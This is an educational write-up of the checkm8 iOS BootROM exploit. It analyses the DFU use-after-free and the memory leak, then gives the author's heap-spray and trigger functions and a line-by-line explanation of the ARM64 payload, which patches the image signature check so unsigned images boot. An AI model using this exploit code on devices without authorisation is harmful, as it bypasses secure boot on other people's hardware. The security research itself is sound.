# A comprehensive write-up of the checkm8 BootROM exploit

- [A comprehensive write-up of the checkm8 BootROM exploit](#a-comprehensive-write-up-of-the-checkm8-bootrom-exploit)
- [Analysis](#analysis)
  - [Introduction](#introduction)
    - [Resources](#resources)
    - [Disclaimer](#disclaimer)
  - [USB initialisation](#usb-initialisation)
  - [Handling of USB transfers](#handling-of-usb-transfers)
    - [Initial request handling](#initial-request-handling)
    - [Data phase](#data-phase)
  - [Use-after-free](#use-after-free)
    - [Lifecycle of image transfer](#lifecycle-of-image-transfer)
    - [USB stack shutdown](#usb-stack-shutdown)
  - [Memory leak](#memory-leak)
    - [Why is a leak needed?](#why-is-a-leak-needed)
    - [USB request structure](#usb-request-structure)
    - [The bug](#the-bug)
- [Exploitation](#exploitation)
  - [Heap feng shui](#heap-feng-shui)
  - [Triggering the use-after-free](#triggering-the-use-after-free)
  - [The payload](#the-payload)
    - [The overwrite](#the-overwrite)
  - [Executing the payload](#executing-the-payload)
    - [Explaining the payload](#explaining-the-payload)
- [Conclusion](#conclusion)

# Analysis
## Introduction
This is my analysis and writeup of the vulnerabilities exploited in the checkm8 BootROM exploit. I wrote this in order to help me gain a better understanding of the vulnerability so that I could design my own strategy for exploitation and write my own implementation of the exploit. The checkm8 exploit relies on a couple of vulnerabilities:
* The main use-after-free (not patched until A14)
* The memory leak (patched in A12)

The memory leak is essential in order to exploit the use-after-free, and I will be going into further detail later on in this writeup. However, it is the patching of this leak that is the reason the use-after-free cannot be exploited on A12 and A13 SoCs.

### Resources
Before we start, there are some important resources that I used to help me understand the exploit:
* [This technical analysis of checkm8](https://habr.com/en/companies/dsec/articles/472762/) by [a1exdandy](https://twitter.com/a1exdandy)
* [This presentation about checkra1n's implementation](https://papers.put.as/papers/ios/2019/LucaPOC.pdf) by [Luca Todesco](https://twitter.com/qwertyoruiopz)
* [This vulnerability writeup](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4) by [littlelailo](https://twitter.com/littlelailo)
* [This checkm8 "Q&A"](https://medium.com/@deepaknx/a-inquisitive-q-a-on-checkm8-bootrom-exploit-82da0d6f6c)
* [ipwndfu](https://github/Axi0mX/ipwndfu) by [axi0mX](https://twitter.com/axi0mX)
* [gaster](https://github.com/0x7FF/gaster) by [0x7FF](https://github.com/0x7FF)
* [securerom.fun](https://securerom.fun) for their collection of BootROM dumps that I reverse engineered

### Disclaimer
Throughout this writeup, any code examples will be taken from the pseudocode to show the flow of control, for legal reasons, but the corresponding functions can also be easily found within the leaked iBoot/BootROM source codes. Additionally, in order to simplify these examples, I have removed any unnecessary code and renamed variables to make them more readable. This includes various size checks and other safety checks that are not relevant. However, function names remain the same.

## USB initialisation
USB is initialised within the `usb_init()` function, which will result in `usb_dfu_init()` being called. The function initialises an interface for DFU which will handle all USB transfers and requests. Furthermore, it allocates and zeroes out the global input/output buffer that is used for data transfers.
```c
int usb_dfu_init()
{   
  // Initialise and zero out the global IO buffer
  // 0x800-sized buffer on a 0x40-byte alignment
  io_buffer = memalign(0x800, 0x40);
  bzero(io_buffer, 0x800);

  // Initialise the global variables
  completionStatus = -1;
  totalReceived = 0;
  dfuDone = false;

  // Initialise the usb interface instance ... //

  return 0;
}
```

Information to take away from this:
* The global IO buffer, which holds all data from USB transfers, is allocated
* `bzero()` is used to fill the entire buffer with zeroes (empty values)
* Global variable to keep track of data received is initialised
* The global USB interface instance is initialised

## Handling of USB transfers
### Initial request handling
When a USB control transfer is received by DFU, the `usb_core_handle_usb_control_receive()` is called. This function finds the registered interface for handling DFU requests and then calls the `handle_request()` function of that interface. In our case, this is the `handle_interface_request()` function, and the following code shows the control flow in the case of the host transferring data to the device. It checks whether the direction of the transfer is host-to-device or device-to-host, and then acts on the request in order to determine what to do next.

In the case of downloading data, which is key for understanding this vulnerability, it will return one of three outcomes:
* **0** - the transfer is completed
* **-1** - the wLength exceeds the size of the IO buffer
* **wLength from the setup packet** - the device is ready to receive the data and is expecting `wLength` bytes
```c
int handle_interface_request(struct usb_device_request *request, uint8_t **out_buffer)
{
  int ret = -1;

  // Host to device
  if ((request->bmRequestType & 0x80) == 0)
  {
    switch(request->bRequest)
    {
      case 1: // DFU_DNLOAD
      {

        if(wLength > sizeof(*io_buffer)) {
          return -1;
        }

        *out_buffer = (uint8_t *)io_buffer; // Set out_buffer to point to IO buffer
        expecting = wLength;
        ret = wLength;
        break;
      }

      case 4: // DFU_CLR_STATUS
      case 6: // DFU_ABORT
      {
        totalReceived = 0;

        if(!dfuDone) {
          // Update global variables to abort DFU
          completionStatus = -1;
          dfuDone = true;
        }

        ret = 0;
        break;
      }
    }
    return ret;
  }
  return -1;
}
```
The important things to note from this are:
* The `out_buffer` pointer passed as an argument is updated to point to the global IO buffer
* It returns the wLength (provided it passes all the checks) as the length it is **expecting to receive** into the IO buffer

The result of this function, which was called from `usb_core_handle_usb_control_receive()`, is then used to indicate the status of the transfer, as shown below. 
```c
int ret = registeredInterfaces[interfaceNumber]->handleRequest(&setupRequest, &ep0DataPhaseBuffer);

// Host to device
if((setupRequest.bmRequestType & 0x80) == 0) {

  // Interface handler returned wLength of data, update global variables
  if (ret > 0) {
    ep0DataPhaseLength = ret;
    ep0DataPhaseInterfaceNumber = interfaceNumber;
    // Begin data phase
  }

  // Interface handler returned 0, transfer is complete
  else if (ret == 0) {
    usb_core_send_zlp();
    // Begin data phase
  }
}

// Device to host
else if((setupRequest.bmRequestType & 0x80) == 0x80) {
    // Begin data phase
}
```
As you can see, if the `handle_interface_request()` function returns a value that is greater than 0, the global variable for the size of the data expected to be transferred is then updated. It's also important to note that the `ep0DataPhaseBuffer` global variable will be updated to point to the global IO buffer if the device prepares for the data phase.

### Data phase
This function is followed by the beginning of the data phase. The important parts of the function for handling the data phase are shown below, and the control flow of this function is crucial for understanding the main vulnerability here. After copying the data into the global data phase buffer, the function checks if all the data has been transferred. If so, it will reset the global variables in order to prepare for the next image to be downloaded.
```c
void handle_ep0_data_phase(u_int8_t *rxBuffer, u_int32_t dataReceived, bool *dataPhase)
{
  // Copying received data into the data phase buffer
  // ...

  // All data has been received
  if(ep0DataPhaseReceived == ep0DataPhaseLength)
  { 
    // Call the interface data phase callback and 
    // send zero-length packet to signify end of transfer

    goto done; // Clear global state
  }
  return;
}
```
Once the data phase is complete, the data from the IO buffer is copied into the image buffer to be loaded and booted later on. After this, the following code is executed in order to clear the global variables as the data transfer is complete. This will then allow DFU to prepare to receive the next image over USB.
```c
done:
  ep0DataPhaseReceived = 0;
  ep0DataPhaseLength = 0; 
  ep0DataPhaseBuffer = NULL;
  ep0DataPhaseInterfaceNumber = -2;
```

This has been a lot to take in, so I will quickly summarise the process:
* In DFU initialisation, the IO buffer is allocated and zeroed out
* When transferring data, the global buffer for the data is set to point to the IO buffer
* Data transferred over USB is hence copied into the IO buffer
* When image transfer is complete, the contents of the IO buffer are copied into an image buffer
* This is followed by the resetting of the global state to prepare for a new image transfer

## Use-after-free
### Lifecycle of image transfer
Now, here's the fun part of the writeup - where I go into the actual vulnerability. When DFU mode is started, the main function that is called is the `getDFUImage()` function, the importants parts of which are shown below:
```c
int getDFUImage(void* buffer, int maxLength)
{
  // Update global variables with parameters
  imageBuffer = buffer;
  imageBufferSize = maxLength;

  // Waits until DFU is finished
  while (!dfuDone) {
    event_wait(&dfuEvent);
  }

  // Shut down all USB operations once done
  usb_quiesce();

   // return ... //
}
```
So, what the function does is essentially allow for image transfers to happen and for DFU to do it's thing, and then shuts down the USB stack once it is finished. Now, looking back at the `handle_ep0_data_phase()` function, the global variables are all reset once the data phase has completed. However, if the data is _never fully transferred_, what happens then? The function simply returns **without clearing the global state**. This is good for us, as the attacker, because it means that the global variable holding the pointer to the IO buffer will still be intact.

### USB stack shutdown
Although it wasn't touched on above, taking another look at the `handle_interface_request()` function above will reveal that sending a `DFU_ABORT` command to DFU will cause it to set the `dfuDone` global variable to `true`, and signal the end of DFU. This can also be done by triggering a USB reset, which calls `handle_bus_reset()`. Back in `getDFUImage()`, this will result in the calling of `usb_quiesce()` to shut down the USB stack. The function looks like this:
```c
void usb_quiesce()
{
  usb_core_stop();
  usb_free();
  usb_inited = false;
}
```
The `usb_free()` function calls `usb_dfu_exit()`, and the only important part of that function is the following:
```c
if (io_buffer) {
  free(io_buffer);
  io_buffer = NULL;
}
```

So, by following the paper trail, we can see that:
* Not completing the data phase results in the global variables remaining intact
* Sending a `DFU_ABORT` command results in the `dfuDone` global variable being set to true
* This causes `usb_quiesce()` to be called, leading to the IO buffer being freed
* `getDFUImage()` returns, and is called again upon re-entry
* The global variables are not re-initialised upon re-entry
* The global variable pointing to the IO buffer remains, but points to the now-freed buffer

As I'm sure you can now tell, this is a use-after-free vulnerability, and it is the one utilised by checkm8. Next, I will go into how this vulnerability can be exploited, in order to gain code execution on the device. However, before it can be exploited, a certain memory leak is required.

If you're particularly eagle-eyed, you may have noticed that once another request was sent to the device with a `bRequest` of `DFU_DNLOAD` after triggering the use-after-free, the global variables would just be set to the new values. The way this is worked around is that no requests will be sent that satisfy the conditions in order for this to happen between the use-after-free being triggered and the overwrite being sent. Once the overwrite is in place at the beginning of the freed buffer, we can send the payload using a `DFU_DNLOAD` request into the new IO buffer and the overwrite will direct execution to the payload. This will all be explained in _much_ more detail later on.

## Memory leak
### Why is a leak needed?
The SecureROM is highly deterministic and, for this reason, the IO buffer is allocated at roughly the same location on the heap each time the USB stack is initialised. However, as the use-after-free requires the re-entry of DFU, and `getDFUImage()` to be called again, it creates a problem for us - as the newly-allocated IO buffer will normally just be placed over the freed buffer - rendering the main vulnerability completely useless. This is where the memory leak comes in - allowing the attacker to trick the heap allocator into allocating the new IO buffer elsewhere on the heap. This is also why the A12 and A13 SecureROMs are not vulnerable to the checkm8 exploit. They are vulnerable to the use-after-free, and it can be triggered, but there is no way to prevent the re-allocation of the IO buffer over the freed one.

For context, a memory leak occurs when objects that are allocated in memory are incorrectly de-allocated or freed - resulting in the memory remaining allocated, but inaccessible.

### USB request structure 
Below is the `usb_device_io_request` structure, which will henceforth be known as simply `io_request`:
```c
struct usb_device_io_request
{
	u_int32_t                       endpoint;
	volatile u_int8_t               *io_buffer;
	int                             status;
	u_int32_t                       io_length;
	u_int32_t                       return_count;
	void (*callback) (struct usb_device_io_request *io_request);
	struct usb_device_io_request    *next;
};
```
There are two fields of this structure that are important in order to understand the memory leak. The `callback` field is a pointer to a function that is called once the request is completed. The `next` field is a pointer to the next `io_request` structure in the linked list of requests.

### The bug
If you stall the device-to-host pipe of DFU, where it will not process any requests while in the stalled state, you can then cause a large number of allocations by sending a large number of requests during the stalled period. This will result in each request having it's `io_request` structure being allocated and becoming part of the linked list for the endpoint. When you unstall the pipe, you can cause all of these requests to be freed and de-allocated. So, with this, we have the ability to allocate and delay the de-allocation of objects on the heap.

Despite being able to do this, these allocations will not persist through a shut down of the USB stack. For this to be the case, we need a memory leak wherein certain requests are never properly de-allocated. 

Luckily, there is a leak vulnerability within the standard callback for an `io_request` object. The device will try to send a zero-length packet if, and only if, the request has a length that is more than zero **and** an exact multiple of the packet size (`0x40`) **and** the host has requested more bytes than this. If both of these conditions are true, the device has to send an additional zero-length packet.
```c
void standard_device_request_cb (struct usb_device_io_request *request)
{
  if ((request->io_length > 0)
  && ((request->io_length % 0x40) == 0)
  && (setup_request.wLength > request->io_length)) { 
    usb_core_send_zlp();
  }
}
```
When a USB reset or a DFU abort causes the USB stack to quiesce, the device initally aborts and disables all endpoints, before performing `bzero()` on the entire endpoint structure array. In the process of shutting down the USB stack, all pending requests are processed as failed, which triggers each of their callbacks. The problem is, these additional zero-length packets are never sent while the stack is shutting down, so are therefore leaked.

So, by stalling the pipe and sending a large number of requests, we can cause lots of request allocations to pile up. By then triggering a USB reset, we can invoke the callbacks of these requests, which will queue additional zero-length packets, which will be leaked.

In A12+ SoCs, when a USB reset occurs, the abort that is subsequently triggered also aborts `EP0_IN` for each setup packet - resulting in `abort()` being called twice. The first abort will queue an additional zero-length packet, but the second will successfully reap it and de-allocate it. It is only after this that the `bzero()` happens.

There is a second bug that factors into the memory leak - wherein the transfer length that is expected by the host device is checked from the setup packet, but said setup packet could have been replaced by the time of the check. When the host receives a last packet with a size of less than `0x40` (because transfers are split into `0x40`-sized packets), the transfer is complete. So, if the transfer length is an exact multiple of `0x40`, a zero-length packet must be sent to signal that the transfer has ended.

However, the callbacks invoked during the shut down of the USB stack could have queued new zero-length packet requests, which would then be leaked - and these can be used for heap shaping. Because of how to heap allocator logic works, if the IO buffer is `0x800` bytes and two allocations are leaked that are exactly `0x800` bytes apart, the space in between them will be preferred as the spot for the next `0x800`-sized allocation (A.K.A. the IO buffer upon DFU re-entry). This is due to the heap allocator choosing the smallest possible space for the allocation, of which the space between the two leaked allocations will be the perfect size.

# Exploitation
Unfortunately, to trigger the use-after-free with an incomplete data phase, you must go beyond the normal boundaries of USB transfers defined in the USB specification. There are two solutions for this that have been utilised in the open-source community: firstly, using micro-controllers (such as an Arduino + USB Host Controller) like [this](https://github.com/a1exdandy/checkm8-a5), to gain maximum control over the USB stack of the host device, allowing you to control exactly what is sent and when; secondly, forcing the cancellation of the transfer midway through, as is done in [ipwndfu](https://github.com/aXi0mX/ipwndfu) and [gaster](https://github.com/0x7FF/gaster) (amongst others) by using an extremely short timeout on an asynchronous transfer.

The stages of exploitation are as follows:
* Shaping the heap (AKA heap feng shui)
* Trigger the use-after-free vulnerability
* Sending and executing the payload

The following sections will have code examples for each of these stages - which are taken from my currently-unreleased checkm8-based project but that are heavily based on the [gaster](https://github.com/0x7FF/gaster) implementation. It is also important to note that it is simplified for the T8011 SoC, but certain areas of the exploit are different for the varying SoCs.

## Heap feng shui
Heap feng shui is the technique of deliberately manipulating the heap and shaping it to benefit exploitation. Using the memory leak discussed earlier, we can trick the heap allocator into allocating the IO buffer in a different location on re-entry - allowing us to access the freed buffer from the previous iteration of DFU.

In order to craft the hole for the next IO buffer, we should do the following:
* Stall the device-to-host endpoint.
* Send a large number requests to create a build-up of request allocations.
* Have the first and last of these requests meet the requirements for sending an additional zero-length packet.
* Trigger a USB reset so that `usb_quiesce()` is called and these requests are leaked.
* Be left with a hole that can be used to control allocation of the next IO buffer.

Accounting for all heap allocations being rounded up to the nearest multiple of `0x40`, and the `0x40`-sized header for each packet, we can safely assume that each `io_request` object will occupy `0x80` bytes on the heap. So, one strategy for heap feng shui would be to send `0x10` non-leaking packets to the device, which would create a hole of size `0x800` - which is exactly the size of the IO buffer. Testing this strategy proved it to be successful in exploitation, but this is not the solution that was chosen.

A quicker, and more simple, strategy (which is utilised in most implementations of the exploit) is to send the _bare minimum_ number of packets such that a hole will be created that is smaller than `0x800`, but big enough that allocations will end up being shuffled around enough so that the IO buffer is allocated elsewhere upon re-entry. This is the strategy used in the function shown below, and it makes the exploit quicker.

Here's the heap spray function from my project, which is adapted for the T8011 BootROM:
```c
bool checkm8HeapSpray(device_t *device)
{
    checkm8Stall(device)
    for (int i = 1; i <= config.hole; i++)
    {
        checkm8NoLeak(device)
    }
    checkm8USBRequestLeak(device)
    checkm8NoLeak(device)
    return true;
}
```
I'll walk through the function step-by-step:

```c
checkm8Stall(device)
```

This stalls the device-to-host endpoint, which will allow for a large number of `io_request` structures to be allocated as we can send requests but they will not be processed while the device is in the stalled state. Additionally, this request will leak a zero-length packet, as it matches the requirements in the callback function in order for an additional zero-length packet to be sent.

```c
for (int i = 1; i <= config.hole; i++)
{
    checkm8NoLeak(device)
}
```
This sends `config.hole` requests to the device, which will each have an `io_request` structure allocated for them. Such requests will not leak zero-length packets, as they do not match the requirements for the callback function to send an additional zero-length packet. This will create a 'hole' as such that they will all be correctly de-allocated when the USB stack is quiesced.

```c
checkm8USBRequestLeak(device)
```
This will leak an additional zero-length packet and give us the hole that we need. This is because we send a zero-length packet at the beginning of the function, so the allocations will currently look something like this:
```
[  Leaked packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Normal packet  ]
[  Leaked packet  ]
```
After resetting the USB stack, it will look something like this:
```
[ Allocated space ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[   Empty space   ]
[ Allocated space ]
```
The heap allocator will then allocate objects inside this hole enough to shuffle around other allocations, which will result in the IO buffer being allocated elsewhere on re-entry.

```c
checkm8NoLeak(device)
```
This will send a request that does not leak a zero-length packet, which will be de-allocated when the USB stack is quiesced. The `checkm8NoLeak()` transfer has a `wLength` of `0xC1`, which is the highest of all the transfers used in heap feng shui. As a result, it will mean that the host is requesting more bytes in the setup packet, which will result in the conditions being met in order for the additional zero-length packets to be sent and then leaked.

At this point, we will have the heap in such a state that the next IO buffer will be allocated in a location other than the standard address, which is occupied by the freed buffer. If the new IO buffer were to be allocated in the same place, we would not be able to exploit the use-after-free vulnerability as the freed buffer would be overwritten.

## Triggering the use-after-free
With the new IO buffer hopefully allocated elsewhere within the heap, thanks to our heap feng shui, we can now trigger the main use-after-free vulnerability.

* Send a setup packet with a request type where `bmRequestType & 0x80 == 0` (we will use `0x21`), a `DFU_DNLOAD` request and a wLength that is less than or equal to `0x800` to the device. This will set all the global variables to their necessary values.
* Begin the data phase but leave it as incomplete in order to evade the clearing of the global state.
* Send a `DFU_ABORT` request in order to cause the IO buffer to be freed and the re-entry of DFU. This will trigger the use-after-free vulnerability.

Here's my function that triggers the use-after-free:

```c
bool checkm8TriggerUaF(device_t *device)
{
  unsigned usbAbortTimeout = 10;
  transfer_ret_t transferRet;

  while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
    if(transferRet.sz < config.overwritePadding 
    && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
    && transferRet.ret == USB_TRANSFER_STALL) {
      sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
      return true;
    }
    if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
      break;
    }
    usbAbortTimeout = (usbAbortTimeout + 1) % 10;
  }
  return false;
}
```

First of all, let's discuss the while loop:
```c
  while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0x800, usbAbortTimeout, &transferRet)) {
    // ... //
    usbAbortTimeout = (usbAbortTimeout + 1) % 10;
  }
```
So essentially what is happening here is that we are sending the required packet to set the global variables, but we continue sending it asynchronously with a shorter and shorter timeout until it is cancelled mid-way through. This is done to achieve the partially complete data phase state on the device.

It's interesting to note that we never ever have to actually send data in order to trigger this use-after-free. Sending the `0x21, DFU_DNLOAD` request will set the global variables _and_ set the global data phase variable to true.

```c
  if(transferRet.sz < config.overwritePadding 
      && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config.overwritePadding - transferRet.sz, &transferRet) 
      && transferRet.ret == USB_TRANSFER_STALL) {
      sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
      return true;
  }
```
Once we have sent the asynchronous request from above, we check if the device returned a size that is less than the overwrite padding. The overwrite padding ensures that the overwrite we send later on goes into the correct location in memory - but I won't go into too much detail on this.

Then, we check if the device is stalled, which indicates that the conditions are ripe for the use-after-free to be triggered, and if so, send a `DFU_CLRSTATUS` to shut down the USB stack and trigger the vulnerability.

After this, the IO buffer from the first iteration has been freed while the global variables still retain their values - including the variable that points to the old IO buffer. The new IO buffer should have been allocated in the hole created during the heap feng shui phase. Hence, by sending data to the device, it will be written into the address in the global variable that points to the old IO buffer.

Next, we need to send our overwrite and payload in order to give us full arbitrary code execution.

## The payload
The payload as a whole is the data that we send to the device to grant us full execution over the device as part of the exploitation process. It is sent in two parts:
* The overwrite
* The actual payload

The overwrite is the data that we send to the device in order to overwrite the `callback` and `next` fields of an `io_request` structure. This will then direct the execution flow to the main payload.

The main payload is the machine code that performs actions such as amending the USB serial number and patching signature checks to allow unsigned images to boot on the device.

### The overwrite
For the overwrite, the `callback` and `next` fields in the `io_request` structure at the beginning of the freed buffer need to be overwritten. Both fields are pointers to areas in memory - `callback` being a pointer to the callback function and `next` being a pointer to the next `io_request` structure in the linked list of pending requests.

When exploiting the checkm8 exploit, the overwriting of the `callback` function is an opportunity to restore the link and FP registers to prevent the current USB request from being freed. Because we have overwritten the data in the heap, trying to free the object will result in the invalid heap metadata causing issues and possibly a crash on the device.

For those who aren't sure what the link and FP registers are, here's a quick summary. The link register (LR) holds the address that the program should jump back to after returning from a function. The frame pointer (FP) is used to hold the address of the current **stack frame**, which looks something like this:
```
+-----------------+
|  Return Address |
+-----------------+
|  Arguments      |
|  and Parameters |
+-----------------+
| Local Variables |
+-----------------+
| Saved Registers |
+-----------------+
|  Frame Pointer  |
+-----------------+
```
The stack frame is the area of the stack that is currently being used by the program, and typically changes when a function is called or returns. As you can see, it holds local variables, the return address and other data important to the program at that time.

However, you may be wondering - what is the point of restoring these registers? Well, if you think back to what happens when the USB stack shuts down, it will process the list of pending requests and `usb_core_complete_endpoint_io()` will invoke the callback function for each of them. However, after doing so, this function will free the IO request object. If we can restore the link and FP registers, we can have execution jump back to the function that called `usb_core_complete_endpoint_io()`, instead of continuing on to free the IO request object in this function.

However, as `callback` is a pointer to an area in memory, we cannot simply just overwrite the field with machine code to do this job for us. This leads me to the `nop` gadget, which is used in popular checkm8 implementations - although the name is not particularly accurate. `nop` means "no operation", and is typically code that does nothing. However, in the case of checkm8, the `nop` gadget that is in the BootROM code looks like this:
```
ldp x29, x30, [sp, #0x10]
ldp x20, x19, [sp], #0x20
ret
```
For some context, the `x29` register is the frame pointer, and the `x30` is the link register. It's also important to know that for ARM64, the stack usually grows downwards, from a high address to a low address, and the stack pointer (SP) holds the address of the lowest address occupied by the stack.

So, with that, here is a breakdown of `ldp x29, x30, [sp, #0x10]`:
1. `ldp` is the load pair instruction, which loads a pair of registers from memory into the specified address.
2. `x29, x30` is the pair of registers to load from.
3. `[sp, #0x10]` is the address to load the registers from. `sp` is the stack pointer, and `#0x10` is the offset from the stack pointer to load the registers from.
Because the stack grows downwards, adding `0x10` to the stack pointer will point to the memory just above the stack pointer, which is where the link and FP registers are stored. `0x10` is the combined size of the pair of registers, AKA 16 bytes - as each register is 64 bits, or 8 bytes.

`ldp x20, x19, [sp], #0x20` does a similar job, except it loads the registers from the stack pointer without an offset, but then **increments** the stack pointer by `0x20` (32 bytes) - this is done for alignment purposes and to ensure that the stack pointer is pointing to the correct address for the next instruction that may access that memory.

Finally, `ret` is the return instruction, which will return to the address stored in the link register.

## Executing the payload
With the payload in place and an `io_request` having it's `next` field pointing to an address inside our payload, we can trigger a USB reset. As always, this will process the list of pending requests (which we just allocated while stalled) as failed, and will invoke the callback for each of these requests.

When it reaches our overflown `io_request` object, it will execute the callback (which is just a `nop` gadget to restore the link and FP registers) and then follow the `next` field to arrive in the middle of our payload. It will then try to execute the `callback` field of what it believes is an `io_request` object, but actually just begin executing our callback chain at the address we overflowed the `next` field with + the offset of the `callback` field in the `io_request` structure (`0x20`).

Now, I will go through the payload and aim to explain exactly what it does at each step.

### Explaining the payload
While ARM64 assembly may seem rather daunting, you will see that it actually makes a lot of sense once you understand what each instruction does. Here is the `_main` function from the main checkm8 payload for T8011, which also contains another label as part of it:
```asm
_main:
  stp x29, x30, [sp, #-0x10]!
  ldr x0, =payload_dest
  ldr x2, =dfu_handle_bus_reset
  str xzr, [x2]
  ldr x2, =dfu_handle_request
  add x1, x0, #0xC
  str x1, [x2]
  adr x1, _main
  ldr x2, =payload_off
  add x1, x1, x2
  ldr x2, =payload_sz
  ldr x3, =memcpy_addr
  blr x3
  ldr x0, =gUSBSerialNumber
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
  adr x1, PWND_STR
  ldp x2, x3, [x1]
  stp x2, x3, [x0]
  ldr x0, =gUSBSerialNumber
  ldr x1, =usb_create_string_descriptor
  blr x1
  ldr x1, =usb_serial_number_string_descriptor
  strb w0, [x1]
  mov w0, #0xD2800000
  ldr x1, =patch_addr
  str w0, [x1]
  ldp x29, x30, [sp], #0x10
  ret

PWND_STR:
.asciz " PWND:[checkm8]"
```

The first line simply stores the new link register and frame pointer, as any program would do when branching to a new function. However, after this line, the proper payload begins.

```asm
ldr x0, =payload_dest
ldr x2, =dfu_handle_bus_reset
str xzr, [x2]
```
This loads the address of the payload destination into the `x0` register, and the address of `dfu_handle_bus_reset` into `x2`. `dfu_handle_bus_reset` is the `handle_bus_reset` property of the USB interface instance created when DFU starts, and is simply a pointer to the `handle_bus_reset()` function. After this, the value in the `xzr` register (the zero register) is stored into memory at the address of `dfu_handle_bus_reset` in order to ensure the device does not respond to a USB reset and trigger the shut down of the USB stack again - as this will cause issues due to the state of the heap and how we are using the allocated `io_request` structures for the exploit.

```asm
ldr x2, =dfu_handle_request
add x1, x0, #0xC
str x1, [x2]
```
This loads the address of `dfu_handle_request` (which is the `handle_request` field of the interface instance) into `x2`, and then adds `0xC` to the value in `x0` (the payload destination) and then stores the result in `x1`. It then stores the value in `x1` into the value at the address stored in `x2`, which is `dfu_handle_request`. This means that when `interface->handle_request()` is called, it will jump to the shellcode inside `payload_handle_checkm8_request.S`, which is gaster specific and does not need to be gone into here. TLDR: it replaces the `handle_request()` function of the DFU interface with a custom one that will do something different when a specific USB request is sent (`0xA1, 2`). Gaster uses this in the `gaster_command()` function for encryption/decryption operations. If this specific request is not used, the replacement shellcode will just call the standard `handle_interface_request()`.

```asm
adr x1, _main
ldr x2, =payload_off
add x1, x1, x2
ldr x2, =payload_sz
ldr x3, =memcpy_addr
blr x3
```
This will load the PC-relative address of `_main` into `x1`, and the address of the end of the payload into `x2`. By adding them together and storing the result in `x1`, we can calculate the address that is `payload_off`-bytes from the address of `_main`. The `payload_sz` variable is then loaded into `x2` and the address of the `memcpy()` function is loaded into `x3`. Finally, `blr x3` will branch to the address in `x3` but have the link register link back to the `_main` function, and execute `memcpy()`.

The parameters of `memcpy()` are as follows: `memcpy(void *dst, void *src, size_t n)`. So, the address of the payload destination is still stored in `x0`, the address of the payload is stored in `x1` and the size of the payload is stored in `x2`. Hence, the `memcpy()` call will copy the payload into the payload destination.

```asm
ldr x0, =gUSBSerialNumber
```
After returning from `memcpy()`, the address of `gUSBSerialNumber` (global USB serial number) is loaded into `x0` as the payload destination is no longer needed in the payload.

```
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
```
This is a loop that will increment the address in `x0` (`gUSBSerialNumber`) by `1` and load the byte at that address into `w1`. If the byte is not zero, it will branch back to `_find_zero_loop` and continue. This will continue until the byte at the address in `x0` is zero, at which point it will continue on to the next instruction. It does this to find the end of the serial number string in memory, so that it can add `PWND:[checkm8]` to the end of it.

```
adr x1, PWND_STR
ldp x2, x3, [x1]
stp x2, x3, [x0]
```
As you can see, `PWND_STR` is loaded into `x1`, and then the pair of registers `x2` and `x3` are loaded from the address in `x1`. These are then stored into the address in `x0`, which is the end of the serial number string. This will add `PWND:[checkm8]` to the end of the serial number string.

```asm
ldr x0, =gUSBSerialNumber
ldr x1, =usb_create_string_descriptor
blr x1
```
The started address of `gUSBSerialNumber` is once again loaded into `x0`, and the address of the `usb_create_string_descriptor()` function into `x1`. Then, by branching with a link to the register `x1`, the device creates a new string descriptor using the serial number so that it will appear to the host computer with the custom serial number string.

```asm
ldr x1, =usb_serial_number_string_descriptor
strb w0, [x1]
```
The `usb_serial_number_string_descriptor` is then updated with the new serial number string to reflect the changes just made by the payload.

```asm
mov w0, #0xD2800000
ldr x1, =patch_addr
str w0, [x1]
```
A value of `0xD2800000` is loaded into `w0`, which corresponds to the instruction `mov x0, 0`. The value in `patch_addr` is loaded into `x1`, and `0xD2800000` is written into memory at the address pointed to by `patch_addr`. The reason for this is that `patch_addr` points to an instruction inside the `image4_validate_property_callback()`, and replaces it - this is so that if an image is found to not be properly signed, instead of branching to a function that will reject it, `mov x0, 0` will set the return value to 0, so the device will think it is a validly-signed image. This is the signature check patch that is used to allow booting untrusted images.

And that's it - the payload has executed, signature checks are patched, the serial number is updated and the exploit is **finally complete**.

# Conclusion
With that, I will conclude this write-up on the checkm8 exploit. It has certainly been immensely interesting for me and I've learned a lot about both the BootROM, but also exploitation in general. Until researching checkm8, I had no idea how important memory leaks can be in exploitation.

I hope that this write-up has offered a thorough insight into the checkm8 exploit, and that it has been helpful to you.

If you spot any errors, or have any feedback (positive or negative!), please don't hesitate to contact me and let me know - I'd rather fix the errors ASAP than have anyone learn incorrect information! Furthermore, extra questions are welcome and I will try to answer all as quick as I can.

If you would like to contact me, drop me an email at alfie@alfiecg.uk. Thank you!